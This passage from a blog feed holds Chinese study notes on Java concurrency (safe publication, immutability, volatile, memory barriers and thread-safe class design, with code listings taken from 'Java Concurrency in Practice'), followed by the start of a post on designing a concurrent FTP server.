class="class"><span class="keyword">class</span> <span class="title">OneValueCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BigInteger lastNumber;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BigInteger[] lastFactors;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OneValueCache</span><span class="params">(BigInteger i,</span></span></span><br><span class="line"><span class="function"><span class="params">                         BigInteger[] factors)</span> </span>&#123;</span><br><span class="line">        lastNumber = i;</span><br><span class="line">        <span class="comment">// 如果没有这个copyOf，就不是不可变的</span></span><br><span class="line">        lastFactors = Arrays.copyOf(factors, factors.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BigInteger[] getFactors(BigInteger i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastNumber == <span class="keyword">null</span> || !lastNumber.equals(i))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> Arrays.copyOf(lastFactors, lastFactors.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VolatileCachedFactorizer</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> OneValueCache cache =</span><br><span class="line">            <span class="keyword">new</span> OneValueCache(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse resp)</span> </span>&#123;</span><br><span class="line">        BigInteger i = extractFromRequest(req);</span><br><span class="line">        <span class="comment">// 如果这里多个请求到来，某个请求调用getFactors调用到一半</span></span><br><span class="line">        <span class="comment">// 然后另一个请求则把cache赋值成另外一个对象，那么有没有问题？</span></span><br><span class="line">        <span class="comment">// 似乎c++就不可以这样做，因为这个需要自动垃圾收集</span></span><br><span class="line">        BigInteger[] factors = cache.getFactors(i);</span><br><span class="line">        <span class="keyword">if</span> (factors == <span class="keyword">null</span>) &#123;</span><br><span class="line">            factors = factor(i);</span><br><span class="line">            cache = <span class="keyword">new</span> OneValueCache(i, factors);</span><br><span class="line">        &#125;</span><br><span class="line">        encodeIntoResponse(resp, factors);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="正确的发布"><a href="#正确的发布" class="headerlink" title="正确的发布"></a>正确的发布</h3><ul><li><p>发布（publish）：使对象能够在当前作用域之外的代码中使用</p></li><li><p>逸出（escape）：某个不该发布的对象被发布</p></li><li><p>不可变对象<strong>可以通过任意的机制发布</strong></p><ul><li><p>3.4节，不可变对象那里，代码3-13使用了<code>volatile</code>来保证其他线程看到最新的引用。另外，3.5.2节说，即使发布不可变对象时，没有使用同步，仍然可以安全的访问该对象（上面那一段说，“即使某个对象的引用对于其他线程可见，也不意味着对象的状态对于使用该对象的线程一定是可见的”）。这里的“不需要同步”的含义是指，不需要同步即可以保证对象状态的可见性，而不是说，每次更新引用，都会让其他线程看到新的引用值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SynTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> FC fc = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            fc = <span class="keyword">new</span> FC();</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (fc == <span class="keyword">null</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> n = fc.n * <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">assert</span> n * <span class="number">10</span> == <span class="number">50</span> * <span class="number">20</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        t2.start();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FC</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>第二个线程没有退出。所以，其实不可变对象的发布时不需要同步的含义应该是“另一个线程可以看到完整的对象状态”。（很奇怪，如果把两个<code>start</code>的位置颠倒，或者是去掉<code>sleep</code>，则会导致成功结束)</p></li><li>Java内存模型为不可变对象的共享提供了一种特殊的初始化安全性保证</li><li>即使在发布不可变对象的引用时没有使用同步，也可以安全的访问该对象。为了实现这种安全，对象必须满足上面提到的不可变对象的所有要求</li><li>这种保证还包括被<strong>正确创建对象</strong>中的所有final类型的域。但是如果这些域是可变对象，那么在访问时还是需要同步</li></ul></li><li>事实不可变对象（比如某个<code>Date</code>对象被构造后，就只执行读操作，类似于java要求lambda可以读取的lambda外变量是“事实不可变的”）<strong>必须通过安全的方式发布</strong></li><li>可变对象<strong>必须通过安全的方式发布</strong>，并且必须是线程安全的或者某个锁保护起来</li></ul><h4 id="可变对象的正确的发布"><a href="#可变对象的正确的发布" class="headerlink" title="可变对象的正确的发布"></a>可变对象的正确的发布</h4><ul><li><p>即使某个对象的引用对于其他线程是可见的，也不意味着对象状态对于使用该对象的线程是一定可见的。为了确保对象状态呈现出一致性视图（对象的引用与对象的状态必须同时对其他线程可见），必须要使用<strong>同步</strong>（包括发布时和使用时）</p></li><li><p>常用的发布模式</p><ul><li><p>在静态初始化函数中初始化一个对象引用（不知道“静态初始化函数”是否等价于“静态初始化器”）（因为静态初始化器由JVM在类的初始化阶段执行，JVM内部存在同步机制）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Holder holder = <span class="keyword">new</span> Holder(<span class="number">42</span>);</span><br></pre></td></tr></table></figure><blockquote><p>虚拟机会保证一个类的<code>&lt;clinit&gt;()</code>方法在多线程环境中被正确地加锁、同步,如果多个线程同时去初始化一个类,那么只会有一个线程去执行这个类的<code>&lt;clinit&gt;()</code>方法,其他线程都需要阻塞等待,直到活动线程执行<code>&lt;clinit&gt;()</code>方法完毕</p><p><code>&lt;clinit&gt;()</code>方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块(<code>static{}</code>块)中的语句合并产生的</p><p>来自深入理解JVM</p></blockquote></li><li><p>将对象的引用保存在volatile类型的域或者AtomicReference对象中</p></li><li><p>将对象的引用保存在某个正确构造对象的final类型域中</p></li><li><p>将对象的引用保存在一个由锁保护的域中</p><ul><li>线程安全容器（比如<code>Hashtable</code>、<code>synchronizedMap</code>、<code>ConcurrentMap</code>、<code>Vector</code>、<code>CopyOnWriteArrayList</code>、<code>CopyOnWriteArraySet</code>、<code>synchronizedList</code>、<code>synchronizedSet</code>、<code>BlockingQueue</code>、<code>ConcurrentLinkedQueue</code>）内部的同步意味着将对象放入到某个容器中，将满足这一条要求）</li><li><code>Future</code>、<code>Exchanger</code>也可以</li></ul></li></ul></li></ul><h3 id="lambda使用外部的对象（或value-type的变量）"><a href="#lambda使用外部的对象（或value-type的变量）" class="headerlink" title="lambda使用外部的对象（或value type的变量）"></a>lambda使用外部的对象（或value type的变量）</h3><blockquote><p>以下均为我个人根据final域的特性认为的——不知道final域与final变量的差别是什么</p></blockquote><ul><li>lambda可以使用外部的final或事实final的变量</li><li>如果是这个final对象引用的变量，没有问题，可见（就是引用对于其他线程可见时，其内部的状态也是，可以保证一致性）</li><li>如果引用的是可变对象，则要同步</li></ul><h3 id="内部类与final变量"><a href="#内部类与final变量" class="headerlink" title="内部类与final变量"></a>内部类与final变量</h3><ul><li>TODO：内部类引用外部的变量时，不要求其为final的，那么怎么办，可见性如何保证</li></ul><h3 id="volatile-vs-锁"><a href="#volatile-vs-锁" class="headerlink" title="volatile vs 锁"></a>volatile vs 锁</h3><ul><li>锁可以确保可见性和原子性</li><li>volatile只确保可见性</li></ul><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul><li>开发服务器应用时，要始终加上<code>-server</code>参数，client模式的JVM优化与server的不一样</li></ul><h3 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h3><ul><li>MFENCE, LFENCE, SFENCE (Ref from intel manual 325462-sdm-vol-1-2abcd-3abcd)<blockquote><ul><li>MFENCE: Performs a serializing operation on all load-from-memory and store-to-memory instructions that were issued prior the MFENCE instruction. <strong>This serializing operation guarantees that every load and store instruction that precedes the MFENCE instruction in program order becomes globally visible before any load or store instruction that follows the MFENCE instruction.</strong> The MFENCE instruction is ordered with respect to all load and store instructions, other MFENCE instructions, any LFENCE and SFENCE instructions, and any serializing instructions (such as the CPUID instruction). MFENCE does not serialize the instruction stream.</li><li>SFENCE: Orders processor execution relative to all memory stores prior to the SFENCE instruction. <strong>The processor ensures that every store prior to SFENCE is globally visible before any store after SFENCE becomes globally visible.</strong> The SFENCE instruction is ordered with respect to memory stores, other SFENCE instructions, MFENCE instructions, and any serializing instructions (such as the CPUID instruction). It is not ordered with respect to memory loads or the LFENCE instruction.</li><li>LFENCE: <strong>Performs a serializing operation on all load-from-memory instructions that were issued prior the LFENCE instruction. Specifically, LFENCE does not execute until all prior instructions have completed locally, and no later instruction begins execution until LFENCE completes</strong>. In particular, an instruction that loads from memory and that precedes an LFENCE receives data from memory prior to completion of the LFENCE. (An LFENCE that follows an instruction that stores to memory might complete before the data being stored have become globally visible.) Instructions following an LFENCE may be fetched from memory before the LFENCE, but they will not execute until the LFENCE completes.</li></ul></blockquote></li><li>read barrier, write barrier, (<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/Documentation/memory-barriers.txt?id=HEAD" target="_blank" rel="noopener">Ref</a>)<blockquote><ul><li>Read barrier: <strong>A read barrier is a data dependency barrier plus a guarantee that all the LOAD operations specified before the barrier will appear to happen before all the LOAD operations specified after the barrier with respect to the other components of the system.</strong> A read barrier is a partial ordering on loads only; <strong>it is not required to have any effect on stores</strong>. Read memory barriers imply data dependency barriers, and so can substitute for them. [!] Note that read barriers should normally be paired with write barriers; see the “SMP barrier pairing” subsection.</li><li>Data dependency barrier:  <strong>A data dependency barrier is a weaker form of read barrier. In the case where two loads are performed such that the second depends on the result of the first</strong> (eg: the first load retrieves the address to which the second load will be directed), a data dependency barrier would be required to make sure that the target of the second load is updated after the address obtained by the first load is accessed. </li><li>General memory barriers. <strong>A general memory barrier gives a guarantee that all the LOAD and STORE operations specified before the barrier will appear to happen before all the LOAD and STORE operations specified after the barrier with respect to the other components of the system</strong>. </li><li>Write memory barrier: <strong>A write memory barrier gives a guarantee that all the STORE operations specified before the barrier will appear to happen before all the STORE operations specified after the barrier with respect to the other components of the system</strong>. </li></ul></blockquote></li></ul><h3 id="设计线程安全类"><a href="#设计线程安全类" class="headerlink" title="设计线程安全类"></a>设计线程安全类</h3><ul><li>三个要素<ul><li>找出构成对象状态的所有变量<ul><li>如果在对象域中引用了其他对象，那么该对象的状态就包含被引用对象的域</li><li>在定义哪些变量将构成对象的状态时，只考虑对象拥有的数据</li></ul></li><li>找出约束状态变量的不变性条件</li><li>建立对象状态的并发访问管理策略<ul><li>同步策略定义了如何在不违背对象不变条件或后验条件（在操作中会包含一些后验条件来判断状态的迁移是否有效——比如要求某变量如果当前是17，那么下一次更新是18）的情况下对其状态的访问操作进行协同</li><li>同步策略规定了如何将不可变性、线程封闭、加锁机制等结合起来维护线程的安全性。还规定了哪些变量由哪些锁来保护</li><li>必须要将同步策略写为正式文档</li></ul></li></ul></li><li>尽可能使用final域以缩小状态空间</li><li>如果变量的某些状态是无效的，那么就要对该变量进行封装以避免用户的修改使得该变量处于无效状态。如果某个操作中存在无效的状态转换那么该操作就必须是原子的</li><li>如果一个类是由多个独立且线程安全的状态变量组成，并且所有的操作都不包含无效的状态转换，那么可以将线程安全性委托给底层的状态变量</li><li>如果一个状态变量是线程安全的，并且没有任何不变性条件来约束它的值，在变量的操作上也不存在任何不允许的状态转换（然而按照线程安全的定义，似乎如果满足以上要求，那么线程安全也就必然满足），那么就可以安全地发布这个变量</li><li>当把线程安全委托给底层的线程安全对象时，如果这些变量不是<code>final</code>，那么会导致一个问题——引用可能会引用了另一个对象。</li></ul><h3 id="基于现有的线程安全类添加特性"><a href="#基于现有的线程安全类添加特性" class="headerlink" title="基于现有的线程安全类添加特性"></a>基于现有的线程安全类添加特性</h3><ul><li>最好的方法是直接修改原始类，这需要理解代码中的同步策略。好处在于所有实现同步策略的代码在同一个源文件中</li><li>另一种方法是extend这个类，但是可能有的类的一些状态是private，子类访问不到，所以行不通。不好的地方在于同步策略的实现被分布到多个单独维护的源文件中，如果底层的类改变了同步策略那么子类就不安全了。</li><li>客户端加锁：对于使用对象X的用户代码，在用户代码中，使用X本身用于保护其状态的锁来保护这段用户代码。这里的问题在于，如果文档没有明确指出X使用的锁，那么这个锁在以后版本中可能会修改，从而导致用户代码相对于X的代码不是原子的（在用户代码执行过程中，X内的代码可能执行）。这种会破坏同步策略的封装性（类似于extend会破坏实现的封装性）。与前一种一样，都是将派生类的行为与基类的行为耦合在一起</li><li>组合：类似于<code>Collections.synchronizedXXX</code>，用户传递一个对象给该方法（转移所有权，以后都通过这个工厂方法返回的对象来操作），新对象内使用委托和加锁来实现。这种不依赖于被委托对象的线程安全性和使用的锁策略</li></ul><h3 id="依赖状态的操作"><a href="#依赖状态的操作" class="headerlink" title="依赖状态的操作"></a>依赖状态的操作</h3><ul><li>类的不变性条件和后验条件约束了在对象上有哪些状态和状态转换是有效的。在某些对象的方法中还包含一些基于状态的先验条件（比如，从队列中pop时，队列必须非空）。如果某个操作中包含有基于状态的先验条件，则这个操作就叫做依赖状态的操作</li></ul><h3 id="使用私有的锁-vs-使用对象的内置锁"><a href="#使用私有的锁-vs-使用对象的内置锁" class="headerlink" title="使用私有的锁 vs 使用对象的内置锁"></a>使用私有的锁 vs 使用对象的内置锁</h3><ul><li>优点<ul><li>私有锁可以将锁封闭起来，避免用户代码得到锁，以避免用户代码参与到同步策略中</li><li>如果使用内置锁，要想验证锁是否被正确使用，需要检查整个程序</li></ul></li></ul><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><h4 id="一个线程安全的车辆追踪器的代码解析"><a href="#一个线程安全的车辆追踪器的代码解析" class="headerlink" title="一个线程安全的车辆追踪器的代码解析"></a>一个线程安全的车辆追踪器的代码解析</h4><ul><li><p>不可变的Point类，因为不可变，所以复制map时只需要复制map的结构，无需复制Point的内容。返回的unmodifableMap也类似如此。（代码来源，JCIP代码清单4.7和4.6）</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DelegatingVehicleTracker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ConcurrentMap&lt;String, Point&gt; locations;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Point&gt; unmodifiableMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数的安全依赖于用户——如果用户在构造函数运行时，</span></span><br><span class="line">    <span class="comment">// 修改参数points的内容，那么locations的视图就可能是不一致的。</span></span><br><span class="line">    <span class="comment">// 并且，用户需要自己保证这个DelegatingVehicleTracker类是安全的发布的，</span></span><br><span class="line">    <span class="comment">// 从而，保证在构造函数运行完之前，类内的其他非静态函数不会被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DelegatingVehicleTracker</span><span class="params">(Map&lt;String, Point&gt; points)</span> </span>&#123;</span><br><span class="line">        locations = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;(points);</span><br><span class="line">        unmodifiableMap = Collections.unmodifiableMap(locations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回的unmodifiableMap内部是没有同步的，</span></span><br><span class="line">    <span class="comment">// 那么，locations的修改是如何反映到unmodifiableMap的？</span></span><br><span class="line">    <span class="comment">// 通过ConcurrentMap来保证</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Point&gt; <span class="title">getLocations</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unmodifiableMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Point <span class="title">getLocation</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> locations.get(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLocation</span><span class="params">(String id, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (locations.replace(id, <span class="keyword">new</span> Point(x, y)) == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    <span class="string">"invalid vehicle name: "</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> x, y;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.x = x;</span><br><span class="line">            <span class="keyword">this</span>.y = y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可变的线程安全的Point，如果在point的状态上施加不变性任何约束，那么以下就不是线程安全的，因为用户可以修改返回的point对象。（代码来源，JCIP代码清单4.11，4.12）</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublishingVehicleTracker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, SafePoint&gt; locations;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, SafePoint&gt; unmodifiableMap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PublishingVehicleTracker</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            Map&lt;String, SafePoint&gt; locations)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.locations</span><br><span class="line">                = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;(locations);</span><br><span class="line">        <span class="keyword">this</span>.unmodifiableMap</span><br><span class="line">                = Collections.unmodifiableMap(<span class="keyword">this</span>.locations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, SafePoint&gt; <span class="title">getLocations</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unmodifiableMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SafePoint <span class="title">getLocation</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> locations.get(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLocation</span><span class="params">(String id, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!locations.containsKey(id))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    <span class="string">"invalid vehicle name: "</span> + id);</span><br><span class="line">        locations.get(id).set(x, y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SafePoint</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">SafePoint</span><span class="params">(<span class="keyword">int</span>[] a)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(a[<span class="number">0</span>], a[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此处，如果实现为`this(p.x, p.y)`就会有竞态条件，</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SafePoint</span><span class="params">(SafePoint p)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(p.get());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SafePoint</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.x = x;</span><br><span class="line">            <span class="keyword">this</span>.y = y;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span>[] get() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;x, y&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.x = x;</span><br><span class="line">            <span class="keyword">this</span>.y = y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><blockquote><p>来自JCIP的5.2.1，不清楚JDK5之后有没有修改</p></blockquote><ul><li>使用一种粒度更细的加锁机制——分段锁</li><li>一定数量的写入线程可以并发的修改Map</li><li>迭代器具有弱一致性，而不是fail-fast（HashMap等的是fail-fast，从而如果迭代时发现数量变化了，就会抛出<code>ConcurrentModificationException</code>），不会抛出<code>ConcurrentModificationException</code>。可以容忍并发的修改</li><li><code>size</code>返回的只是估计值</li><li>内部没有实现对map加锁以独占访问（对比之下，同步容器<code>Hashtable</code>，<code>synchronizedMap</code>中可以通过获取map的锁来实现独占），所以不能在用户代码通过获取map的锁来独占（所以如果确实需要独占，应该放弃ConcurrentHashMap）</li></ul><h3 id="condition"><a href="#condition" class="headerlink" title="condition"></a>condition</h3><h4 id="Condition-signal要在持有锁时才能调用"><a href="#Condition-signal要在持有锁时才能调用" class="headerlink" title="Condition.signal要在持有锁时才能调用"></a><code>Condition.signal</code>要在持有锁时才能调用</h4><ul><li><p>lost-wake-up问题，比如说代码如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cnt+=<span class="number">1</span>;</span><br><span class="line">notify();</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(cnt&lt;=<span class="number">0</span>) &#123;</span><br><span class="line">    wait();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后，在检查了<code>cnt&lt;=0</code>这个条件后、调用<code>wait</code>之前，有个线程完成了<code>cnt++;notify()</code>的操作，那么消费者就丢失了wake-up，陷入了无限等待（如果其在等待时没有被唤醒的话）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下大部分是&lt;em&gt;java Concurrency in Practice&lt;/em&gt;的笔记，以&lt;code&gt;JCIP&lt;/code&gt;简称之&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;对象的状态&quot;&gt;&lt;a href=&quot;#对象的状态&quot; class
      
    
    </summary>
    
      <category term="JAVA" scheme="https://h-zex.github.io/categories/JAVA/"/>
    
      <category term="JavaConcurrency" scheme="https://h-zex.github.io/categories/JAVA/JavaConcurrency/"/>
    
    
  </entry>
  
  <entry>
    <title>开发一个高并发的FTP服务器</title>
    <link href="https://h-zex.github.io/2019/03/20/%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E9%AB%98%E5%B9%B6%E5%8F%91%E7%9A%84FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://h-zex.github.io/2019/03/20/开发一个高并发的FTP服务器/</id>
    <published>2019-03-20T13:58:41.000Z</published>
    <updated>2019-07-02T15:43:52.405Z</updated>
    
    <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><ul><li>根据RFC959</li><li>高并发(C3K~C4K)</li></ul><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><ul><li><p>在主线程使用epoll，监听listen在21端口的fd，和所有用户的命令链接的fd（以下均以cmdFd简称之）</p></li><li><p>一旦某个fd就绪，就将其封装成任务对象提交给线程池去执行</p></li><li><p>每个用户关联一个Session对象，根据RFC的要求，可以实现为，任意时刻只有小于等于一个线程在handle这个session对象</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ tree src/main </span><br><span class="line">src/main</span><br><span class="line">├── config</span><br><span class="line">│   └── config.hpp</span><br><span class="line">├── core</span><br><span class="line">│   ├── FTP.hpp</span><br><span class="line">│   ├── Login.hpp</span><br><span class="line">│   ├── NetworkManager.hpp</span><br><span class="line">│   └── Session.hpp</span><br><span class="line">├── main.cpp</span><br><span class="line">├── tools</span><br><span class="line">│   ├── FileSystem.hpp</span><br><span class="line">│   ├── ListFiles.hpp</span><br><span class="line">│   └── ThreadPool.hpp</span><br><span class="line">└── util</span><br><span class="line">    ├── Def.hpp</span><br><span class="line">    